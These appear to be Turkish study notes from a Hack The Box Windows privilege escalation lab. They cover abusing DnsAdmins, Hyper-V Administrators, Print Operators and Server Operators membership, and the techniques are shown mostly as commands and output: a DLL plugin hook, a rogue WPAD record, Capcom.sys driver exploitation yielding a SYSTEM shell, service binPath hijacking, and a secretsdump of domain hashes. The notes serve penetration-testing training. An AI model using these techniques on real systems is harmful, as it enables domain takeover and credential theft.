Bir Domain Controller üzerinde yapılandırma değişiklikleri yapmak ve DNS hizmetini durdurmak/yeniden başlatmak çok yıkıcı eylemlerdir ve büyük bir dikkatle uygulanmalıdır. Bir sızma testi uzmanı olarak, bu tür bir eylemi gerçekleştirmeden önce müşterimizle görüşmemiz gerekir çünkü bu eylem potansiyel olarak tüm Active Directory ortamının DNS'ini çökertebilir ve birçok soruna neden olabilir. Müşterimiz bu saldırıya devam etme izni verirse, ya izlerimizi örtebilmeli ve kendimizden sonra temizleyebilmeli ya da müşterimize değişiklikleri nasıl geri alacağına dair adımlar sunabilmeliyiz.  

Bu adımlar, lokal veya domain admin hesabı ile yükseltilmiş bir konsoldan atılmalıdır.


#### **Registry Key Eklendiğini Onaylama**  

İlk adım `ServerLevelPluginDll` kayıt defteri anahtarının var olduğunu doğrulamaktır. Özel DLL'miz kaldırılana kadar, DNS hizmetini tekrar doğru şekilde başlatamayacağız.

```cmd-session
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

#### **Registry Anahtarını Silme**  

Özel DLL'imize işaret eden anahtarı kaldırmak için `reg delete` komutunu kullanabiliriz.

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```


#### **DNS Hizmetini Yeniden Başlatma**  

Bu işlem tamamlandıktan sonra DNS hizmetini yeniden başlatabiliriz.

```cmd-session
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```


#### **DNS Hizmet Durumunu Denetleme**  

Her şey planlandığı gibi gittiyse, DNS hizmetinin sorgulanması çalıştığını gösterecektir. Ayrıca localhost'a veya domain'deki başka bir host'a karşı bir `nslookup` gerçekleştirerek DNS'in ortamda doğru çalıştığını doğrulayabiliriz.

```cmd-session
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Bir kez daha, bu sadece müşterimizin açık izni ve koordinasyonu ile gerçekleştirmemiz gereken potansiyel olarak yıkıcı bir saldırıdır. Riskleri anlıyorlarsa ve tam bir kavram kanıtı görmek istiyorlarsa, bu bölümde özetlenen adımlar saldırıyı göstermeye ve sonrasında temizlemeye yardımcı olacaktır.


## **Mimilib.dll kullanarak**  

Bu [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) ayrıntılı olarak açıklandığı gibi, `Mimikatz` aracının yaratıcısının [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) dosyasını kullanarak, [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) dosyasını bir reverse shell one-liner veya seçtiğimiz başka bir komutu çalıştıracak şekilde değiştirerek komut yürütme elde edebiliriz.

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```


## **WPAD Record Oluşturma**  

DnsAdmins grubu ayrıcalıklarını kötüye kullanmanın bir başka yolu da WPAD record'u oluşturmaktır. Bu gruba üye olmak bize varsayılan olarak bu saldırıyı engelleyen [genel sorgu bloğu güvenliğini devre dışı](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) bırakma hakkı verir. Server 2008 ilk olarak bir DNS sunucusunda genel sorgu bloğu listesine ekleme özelliğini getirmiştir. Varsayılan olarak, Web Proxy Otomatik Keşif Protokolü (WPAD) ve Site İçi Otomatik Tünel Adresleme Protokolü (ISATAP) genel sorgu bloğu listesindedir. Bu protokoller ele geçirilmeye karşı oldukça savunmasızdır ve herhangi bir domain kullanıcısı bu adları içeren bir bilgisayar nesnesi veya DNS kaydı oluşturabilir.

Global sorgu engelleme listesini devre dışı bıraktıktan ve bir WPAD kaydı oluşturduktan sonra, varsayılan ayarlarla WPAD çalıştıran her makinenin trafiği saldırı makinemiz üzerinden proxy'lenecektir. Responder ya da Inveigh gibi bir araç kullanarak trafik spoofing yapabilir ve şifre hash'lerini yakalayıp çevrimdışı olarak kırmaya çalışabilir ya da SMBRelay saldırısı gerçekleştirebiliriz.


#### **Global Sorgu Blok Listesini Devre Dışı Bırakma**

Bu saldırıyı düzenlemek için öncelikle global sorgu blok listesini devre dışı bıraktık:

```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

#### **WPAD Kaydı Ekleme**  

Ardından, saldırı makinemizi işaret eden bir WPAD kaydı ekliyoruz.

```powershell-session
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```



Soru : Ayrıcalıkları yükseltmek için DnsAdmins grubu üyeliğinden yararlanın. c:\Users\Administrator\Desktop\DnsAdmins\flag.txt adresinde bulunan bayrağın içeriğini gönderin

Cevap : 

![Pasted image 20241114215833.png](/img/user/resimler/Pasted%20image%2020241114215833.png)

![Pasted image 20241114215930.png](/img/user/resimler/Pasted%20image%2020241114215930.png)

![Pasted image 20241114215956.png](/img/user/resimler/Pasted%20image%2020241114215956.png)
![Pasted image 20241114220039.png](/img/user/resimler/Pasted%20image%2020241114220039.png)

![Pasted image 20241114220137.png](/img/user/resimler/Pasted%20image%2020241114220137.png)

cmd 'ye  geçtim 

![Pasted image 20241114220811.png](/img/user/resimler/Pasted%20image%2020241114220811.png)

![Pasted image 20241114220833.png](/img/user/resimler/Pasted%20image%2020241114220833.png)

Domain Admins grubunda netadm'de var artık . Fakat değişiklerin uygulanması için makinanın yeniden başlatılması lazım . (shutdown.exe /l) ve cmd için (shutdown /l)

![Pasted image 20241114222404.png](/img/user/resimler/Pasted%20image%2020241114222404.png)


# Hyper-V Administrators

[Hyper-V Administrators](“https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators”) grubu tüm [Hyper-V özelliklerine](“https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines”) tam erişime sahiptir . Domain Controller'lar sanallaştırılmışsa, virtualization admin'leri Domain Admins olarak kabul edilmelidir. Canlı Domain Controller'ın bir klonunu kolayca oluşturabilir ve NTDS.dit dosyasını elde etmek ve domain'deki tüm kullanıcılar için NTLM parola hash'lerini çıkarmak için sanal diski çevrimdışı olarak bağlayabilirler.

Bu [blogda](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), bir sanal makine silindiğinde, `vmms.exe` 'nin ilgili `.vhdx` dosyasındaki orijinal dosya izinlerini geri yüklemeye çalıştığı ve bunu `NT AUTHORITY\SYSTEM` olarak, kullanıcının kimliğine bürünmeden yaptığı da iyi bir şekilde belgelenmiştir. `.vhdx` dosyasını silebilir ve bu dosyayı tam izinlere sahip olacağımız korumalı bir SYSTEM dosyasına yönlendirmek için local bir sabit bağlantı oluşturabiliriz.

İşletim sistemi [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) veya [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)'e karşı savunmasızsa, SYSTEM ayrıcalıklarını elde etmek için bundan yararlanabiliriz. Aksi takdirde, sunucuda SYSTEM bağlamında çalışan ve ayrıcalıksız kullanıcılar tarafından başlatılabilen bir hizmet yükleyen bir uygulamadan yararlanmaya çalışabiliriz.


#### Target File

Bunun bir örneği `Mozilla Maintenance Service`'i yükleyen Firefox'tur. Mevcut kullanıcımıza aşağıdaki dosya üzerinde tam izinler vermek için [bu istismarı](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (NT sabit bağlantısı için bir kavram kanıtı) güncelleyebiliriz:

```shell-session
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### **Dosyanın Sahipliğini Alma**  

PowerShell script'ini çalıştırdıktan sonra, bu dosya üzerinde tam kontrole sahip olmalı ve dosyanın sahipliğini alabilmeliyiz.

```cmd-session
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### **Mozilla Bakım Hizmetini Başlatma**  

Daha sonra, bu dosyayı kötü amaçlı `maintenanceservice.exe` ile değiştirebilir, bakım hizmetini başlatabilir ve SYSTEM olarak komut yürütme elde edebiliriz.

```cmd-session
C:\htb> sc.exe start MozillaMaintenance
```

Not: Bu vektör, sabit bağlantılarla ilgili davranışı değiştiren Mart 2020 Windows güvenlik güncelleştirmeleri ile hafifletilmiştir.

# Print Operators

[Print Operators](“https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators”), üyelerine `SeLoadDriverPrivilege`, bir Domain Controller'a bağlı yazıcıları yönetme, oluşturma, paylaşma ve silme haklarının yanı sıra bir Domain Controller'da local olarak oturum açma ve onu kapatma becerisi veren bir başka yüksek ayrıcalıklı gruptur. `whoami /priv` komutunu verirsek ve yükseltilmemiş bir bağlamdan `SeLoadDriverPrivilege` 'ı göremezsek, UAC'yi atlamamız gerekecektir.

#### **Ayrıcalıkların Onaylanması**

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

#### **Ayrıcalıkları Tekrar Kontrol Etme**

[UACMe](https://github.com/hfiref0x/UACME) reposu, komut satırından kullanılabilecek kapsamlı bir UAC bypass listesi içerir. Alternatif olarak, bir GUI'den, bir yönetici komut shell'i açabilir ve Print Operators grubunun bir üyesi olan hesabın kimlik bilgilerini girebiliriz. Ayrıcalıkları tekrar incelersek, `SeLoadDriverPrivilege` görünür ancak devre dışıdır.

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

`Capcom.sys` driver'ının herhangi bir kullanıcının SYSTEM ayrıcalıklarıyla shellcode çalıştırmasına izin veren bir fonksiyon içerdiği iyi bilinmektedir. Bu savunmasız driver'ı yüklemek ve ayrıcalıkları yükseltmek için ayrıcalıklarımızı kullanabiliriz. Sürücüyü yüklemek için [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) aracı kullanabiliriz. PoC, bizim için sürücüyü yüklemenin yanı sıra ayrıcalığı da etkinleştirir.

Yerel olarak indirin ve aşağıdaki eklentilerin üzerine yapıştırarak düzenleyin.

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Ardından, Visual Studio 2019 Developer Komut İstemi'nden ****cl.exe**** dosyasını kullanarak derleyin.

#### **cl.exe ile derleyin**

```cmd-session
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

#### **Driver'a Referans Ekleme**

Ardından, `Capcom.sys` driver'ını [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) indirin ve `C:\temp` dosyasına kaydedin. HKEY_CURRENT_USER ağacımız altında bu sürücüye bir referans eklemek için aşağıdaki komutları uygulayın.

```cmd-session
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

Kötü niyetli sürücümüzün ImagePath'ine referans vermek için kullanılan `\??\` garip sözdizimi bir [NT Nesne Yoludur](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). Win32 API, kötü amaçlı sürücümüzü düzgün bir şekilde bulmak ve yüklemek için bu yolu ayrıştıracak ve çözümleyecektir.

#### **Sürücünün Yüklü Olmadığını Doğrulayın**  

Nirsoft'un [DriverView.exe](http://www.nirsoft.net/utils/driverview.html) programını kullanarak Capcom.sys sürücüsünün yüklü olmadığını doğrulayabiliriz.

```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```


#### **Ayrıcalığın Etkinleştirildiğini Doğrulayın**  

`EnableSeLoadDriverPrivilege.exe` binary dosyasını çalıştırın.

```cmd-session
C:\htb> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```


#### **Capcom Driver'ın Listelendiğini Doğrulayın**  

Ardından, Capcom sürücüsünün artık listede olduğunu doğrulayın.

```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

#### **Ayrıcalıkları Yükseltmek için ExploitCapcom Aracını Kullanın**  

Capcom.sys'den yararlanmak için, Visual Studio ile derledikten sonra [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) aracını kullanabiliriz.

```powershell-session
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

Bu, SYSTEM ayrıcalıklarına sahip bir shell başlatır.

![Pasted image 20241114232110.png](/img/user/resimler/Pasted%20image%2020241114232110.png)

## **Alternatif Exploitation - GUI Yok**  

Eğer hedefe GUI erişimimiz yoksa, derlemeden önce `ExploitCapcom.cpp` kodunu değiştirmemiz gerekecektir. Burada 292. satırı düzenleyebilir ve `"C:\\Windows\\system32\\cmd.exe` " yerine `msfvenom` ile oluşturulmuş bir reverse shell binary'si koyabiliriz, örneğin: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Bu örnekteki `CommandLine` dizesi şu şekilde değiştirilecektir:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Oluşturduğumuz `msfvenom` payload'una dayalı bir listener kurarız ve `ExploitCapcom.exe`'yi çalıştırırken bir reverse shell bağlantısı geri almayı umarız. Reverse shell bağlantısı herhangi bir nedenle engellenirse, bir bind shell veya exec/add user payload deneyebiliriz.


## **Adımların Otomatikleştirilmesi**  

#### **EopLoadDriver ile Otomatikleştirme**  

Ayrıcalığı etkinleştirme, registry anahtarını oluşturma ve sürücüyü yüklemek üzere `NTLoadDriver` 'ı çalıştırma prosesini otomatikleştirmek için [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) gibi bir araç kullanabiliriz. Bunu yapmak için aşağıdakileri çalıştırırız:

```cmd-session
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

Daha sonra bir SYSTEM shell açmak veya kendi binary'mizi çalıştırmak için `ExploitCapcom.exe` 'yi çalıştırırız.

## **Temizlik**  

#### **Registry Anahtarını Kaldırma**  

Daha önce eklenen kayıt defteri anahtarını silerek izlerimizi biraz kapatabiliriz.

```cmd-session
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```


Soru : Ayrıcalıkları SYSTEM'e yükseltmek için bu bölümdeki adımları izleyin ve flag.txt dosyasının içeriğini administrator's Desktop'a gönderin. Her iki yöntem için gerekli araçlar C:\Tools dizininde bulunabilir veya bunları kendi başınıza derleyip yükleme alıştırması yapabilirsiniz.
Cevap :

![Pasted image 20241115014907.png](/img/user/resimler/Pasted%20image%2020241115014907.png)

![Pasted image 20241115015323.png](/img/user/resimler/Pasted%20image%2020241115015323.png)

![Pasted image 20241115015653.png](/img/user/resimler/Pasted%20image%2020241115015653.png)

![Pasted image 20241115015813.png](/img/user/resimler/Pasted%20image%2020241115015813.png)


![Pasted image 20241115020038.png](/img/user/resimler/Pasted%20image%2020241115020038.png)
![Pasted image 20241115020425.png](/img/user/resimler/Pasted%20image%2020241115020425.png)



# **Server Operatörleri**  

[Sunucu Operatörleri](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) grubu, üyelerin Domain Admin ayrıcalıklarının atanmasına gerek kalmadan Windows sunucularını yönetmelerine olanak tanır. Domain Controllers dahil olmak üzere sunucularda local olarak oturum açabilen çok yüksek ayrıcalıklı bir gruptur.  

Bu gruba üyelik, güçlü `SeBackupPrivilege` ve `SeRestorePrivilege` ayrıcalıklarını ve local servisleri kontrol etme yeteneğini verir.

#### **AppReadiness Service'i Sorgulama**  

`AppReadiness` servisini inceleyelim. Bu servisin `sc.exe` yardımcı programını kullanarak SYSTEM olarak başladığını doğrulayabiliriz. [[Bağlantılar/AppReadiness\|AppReadiness]] servisi nedir ? 

```cmd-session
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

- **sc**: Service Control aracı, Windows hizmetlerini yönetmek ve sorgulamak için kullanılır.
- **qc**: "Query Configuration" anlamına gelir ve bir hizmetin yapılandırma bilgilerini görüntüler.
- **AppReadiness**: Hangi hizmetin bilgilerini sorgulayacağınızı belirtir (bu durumda AppReadiness hizmeti).


### Çıktının Anlamı

1. **SERVICE_NAME: AppReadiness**
    
    - Hizmetin sistemde kullanılan teknik adı.
2. **TYPE: 20 WIN32_SHARE_PROCESS**
    
    - Bu hizmet, başka hizmetlerle aynı işlemde (`svchost.exe`) çalışır.
3. **START_TYPE: 3 DEMAND_START**
    
    - Hizmet elle başlatılır (otomatik çalışmaz, yalnızca ihtiyaç olduğunda veya manuel olarak çalıştırıldığında başlar).
4. **ERROR_CONTROL: 1 NORMAL**
    
    - Hizmet başlatılırken hata oluşursa, sistem çalışmaya devam eder ve yalnızca bir uyarı kaydedilir.
5. **BINARY_PATH_NAME: C:\Windows\System32\svchost.exe -k AppReadiness -p**
    
    - Hizmetin çalıştırıldığı dosya: **svchost.exe** (birden fazla hizmeti çalıştıran bir Windows işlemi).
    - `-k AppReadiness`: Bu belirli hizmet grubu için bir parametre.
    - `-p`: Bu hizmete daha yüksek bir öncelik verildiğini gösterir.
6. **LOAD_ORDER_GROUP:**
    
    - Bu hizmetin belirli bir yükleme sırasına bağlı olmadığını gösterir.
7. **TAG: 0**
    
    - Hizmet etiketi, genellikle yükleme sırasını belirtir. Burada sıralamada özel bir önceliği yoktur.
8. **DISPLAY_NAME: App Readiness**
    
    - Hizmetin kullanıcı tarafından görülen adı.
9. **DEPENDENCIES:**
    
    - Bu hizmetin çalışması için başka bir hizmete bağlı olmadığını belirtir.
10. **SERVICE_START_NAME: LocalSystem**
    
    - Hizmet, **LocalSystem** hesabı altında çalışır. Bu, sistemin tam erişim yetkisine sahip bir hesabıdır.


#### **PsService ile Servis İzinlerini Kontrol Etme**  

Servis üzerindeki izinleri kontrol etmek için Sysinternals paketinin bir parçası olan [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)servis görüntüleyici/kontrolörünü kullanabiliriz. `PsService`, `sc` yardımcı programı gibi çalışır ve servis durumunu ve yapılandırmalarını görüntüleyebilir ve ayrıca hem local hem de remote hostlarda servisleri başlatmanıza, durdurmanıza, duraklatmanıza, devam ettirmenize ve yeniden başlatmanıza izin verir.

```cmd-session
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

Bu, Server Operators grubunun [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) erişim hakkına sahip olduğunu doğrular, bu da bize bu servis üzerinde tam kontrol sağlar.

`PsService.exe` aracının **`security`** parametresi, belirli bir hizmetin güvenlik bilgilerini görüntülemek için kullanılır.


#### **Local Admin Grup Üyeliğini Kontrol Etme**

Local administrators grubunun mevcut üyelerine bir göz atalım ve hedef hesabımızın mevcut olmadığını doğrulayalım.

```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```


#### **Service Binary Yolunun Değiştirilmesi**  

Mevcut kullanıcımızı varsayılan local administrators grubuna ekleyen bir komut çalıştırmak için binary yolunu değiştirelim.

```cmd-session
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

`sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` komutu, **AppReadiness** hizmetinin çalıştırılabilir dosya yolunu (binary path) değiştirmek için kullanılır. Komutun amacı, hizmet çalıştırıldığında başka bir komutun yürütülmesini sağlamaktır. İşte bu komutun detaylı bir açıklaması:


### Komutun Parçaları ve Anlamları

1. **`sc`**:  
    Windows Service Control (Hizmet Kontrol) aracı. Hizmetleri yapılandırmak, başlatmak, durdurmak ve sorgulamak için kullanılır.
    
2. **`config`**:  
    Belirtilen hizmetin yapılandırmasını değiştirme komutu.
    
3. **`AppReadiness`**:  
    Hedef hizmetin adı (burada `AppReadiness` hizmeti).
    
4. **`binPath=`**:  
    Hizmetin çalıştırılabilir dosyasının yolunu belirtir. Bu, hizmet çalıştırıldığında hangi komutun veya dosyanın yürütüleceğini tanımlar.
    
5. **`"cmd /c net localgroup Administrators server_adm /add"`**:
    
    - **`cmd /c`**: Windows Komut İstemi'ni çalıştırır ve ardından verilen komutu yürütür. Yürütme tamamlandıktan sonra komut istemi kapanır.
    - **`net localgroup`**: Windows'un yerel grupları yönetmek için kullanılan bir komutudur.
    - **`Administrators`**: Hedef grup adı. Bu, yerel yöneticiler grubunu ifade eder.
    - **`server_adm`**: Gruplara eklenecek kullanıcı hesabı.
    - **`/add`**: Belirtilen kullanıcıyı hedef gruba ekler.

#### **Servis Başlatma**  

Servisin başlatılması başarısız olur, bu beklenen bir durumdur.

```cmd-session
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

#### **Local Admin Grup Üyeliğini Onaylama**  

administrators grubunun üyeliğini kontrol edersek, komutun başarıyla yürütüldüğünü görürüz.

```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```


#### **Domain Controller'da Local Admin Access'i Onaylama**  

Buradan, Domain Controller üzerinde tam kontrole sahibiz ve NTDS veritabanından tüm kimlik bilgilerini alabilir, diğer sistemlere erişebilir ve istismar sonrası görevleri gerçekleştirebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```


#### **Domain Controller'dan NTLM Parola Hash'lerini Alma**

```shell-session
M1R4CKCK@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```


Soru : Bu bölümde gösterilen yöntemleri kullanarak ayrıcalıkları yükseltin ve c:\Users\Administrator\Desktop\ServerOperators\flag.txt adresinde bulunan bayrağın içeriğini gönderin
Cevap : 

![Pasted image 20241115191221.png](/img/user/resimler/Pasted%20image%2020241115191221.png)

![Pasted image 20241115191252.png](/img/user/resimler/Pasted%20image%2020241115191252.png)

![Pasted image 20241115191338.png](/img/user/resimler/Pasted%20image%2020241115191338.png)

kendimizi bu gruba eklemeliyiz. 

![Pasted image 20241115191529.png](/img/user/resimler/Pasted%20image%2020241115191529.png)

Hata vermesi normal .  Çünkü aslında bir kod çalıştı . Restart edelimki değişiklikler uygunlansın . 

![Pasted image 20241115191829.png](/img/user/resimler/Pasted%20image%2020241115191829.png)



# Attacking the OS 


# User Account Control

